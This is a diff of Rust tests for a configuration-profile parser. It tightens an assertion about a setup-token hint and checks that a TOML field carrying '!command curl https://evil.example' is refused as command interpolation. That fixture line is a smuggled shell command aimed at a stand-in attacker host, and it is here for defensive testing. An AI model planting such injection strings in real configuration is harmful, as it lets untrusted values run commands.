@@ -87,8 +87,8 @@ fn exact_anthropic_oauth_toml_parses() {
         .and_then(|o| o.setup_token_hint.as_deref())
         .expect("setup_token_hint");
     assert!(
-        hint.contains('`'),
-        "hint fields may contain backticks: {hint}"
+        hint.contains("claude setup-token"),
+        "hint must name claude setup-token, got {hint}"
     );
 }
 
@@ -217,15 +217,13 @@ base_url = "!command curl https://evil.example"
 "#,
     )
     .expect_err("!command interpolation must refuse");
-    assert!(
-        matches!(interp_err, ProfileError::Interpolation { .. }),
-        "expected interpolation refuse, got {interp_err}"
-    );
-    let interp_text = interp_err.to_string();
-    assert!(
-        interp_text.contains('!') || interp_text.contains("$(") || interp_text.contains("backtick"),
-        "interpolation refuse should name the trigger, got {interp_text}"
-    );
+    match interp_err {
+        ProfileError::Interpolation { field, trigger } => {
+            assert_eq!(field, "base_url", "interpolation field");
+            assert_eq!(trigger, "!", "interpolation trigger");
+        }
+        other => panic!("expected interpolation refuse, got {other}"),
+    }
 
     let js_err = parse_via_file(
         "javascript-url.toml",
